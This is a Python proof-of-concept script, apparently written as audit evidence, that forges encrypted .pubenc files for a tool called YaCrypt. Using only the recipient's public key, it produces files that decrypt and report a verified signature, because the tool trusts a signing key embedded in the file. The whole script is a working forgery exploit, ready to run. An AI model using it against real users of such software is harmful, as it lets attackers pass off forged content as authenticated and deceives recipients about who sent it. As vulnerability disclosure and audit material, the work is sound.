#!/usr/bin/env python3
"""YaCrypt pubenc forgery PoC (audit evidence).

Demonstrates that ANY party who knows ONLY the recipient's X25519 PUBLIC key
can produce a .pubenc file that decrypts successfully AND reports
"File signature verified successfully", because the Ed25519 verifying key is
taken from the file itself with no trust anchor.

Usage: poc_forge.py <victim_x25519_pub_b64_file> <out.pubenc> <payload_text>
"""
import base64
import hashlib
import hmac
import os
import sys

from nacl import bindings, signing


def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int) -> bytes:
    """RFC 5869 HKDF-SHA256 — matches src/crypto.rs derive_symmetric_key_from_shared_secret."""
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, i = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        i += 1
    return okm[:length]


def main() -> None:
    pub_path, out_path, payload = sys.argv[1], sys.argv[2], sys.argv[3].encode()
    victim_pub = base64.b64decode(open(pub_path).read().strip())
    assert len(victim_pub) == 32, "victim pubkey must be 32 bytes"

    # Attacker ephemeral X25519 keypair — the attacker knows its own secret.
    eph_priv = os.urandom(32)
    eph_pub = bindings.crypto_scalarmult_base(eph_priv)
    shared = bindings.crypto_scalarmult(eph_priv, victim_pub)

    # Same HKDF call as the tool (salt = ephemeral pub, info = fixed string).
    sym = hkdf_sha256(ikm=shared, salt=eph_pub, info=b"yacrypt-file-encryption-v1", length=32)

    # Attacker's own Ed25519 identity — embedded in the file, never checked.
    sk = signing.SigningKey.generate()
    vk = bytes(sk.verify_key)
    sig = sk.sign(payload).signature

    aad = f"file=forged.txt|ephemeral_pub={eph_pub.hex()}|sig_vk={vk.hex()}".encode()
    nonce = os.urandom(24)
    ct = bindings.crypto_aead_xchacha20poly1305_ietf_encrypt(payload, aad, nonce, sym)

    blob = (
        b"SCFv1"
        + b"\x01"  # flags: HAS_SIGNATURE
        + vk
        + sig
        + eph_pub
        + nonce
        + len(aad).to_bytes(2, "big")
        + aad
        + len(ct).to_bytes(8, "big")
        + ct
    )
    open(out_path, "wb").write(blob)
    print(f"[forge] wrote {out_path}: {len(blob)} bytes; attacker vk={vk.hex()[:16]}...")


if __name__ == "__main__":
    main()
